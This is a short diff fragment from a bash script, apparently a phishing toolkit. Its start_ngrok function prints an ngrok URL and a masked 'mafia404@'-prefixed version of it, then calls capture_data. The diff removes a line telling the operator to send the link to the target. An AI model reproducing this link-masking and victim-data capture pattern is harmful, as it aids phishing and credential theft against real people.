@@ -256,7 +256,6 @@ start_ngrok() {
 	ngrok_url1=${ngrok_url#https://}
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mafia404@$ngrok_url1"
-${RED} Send this link to the Target
 	capture_data
 }
 
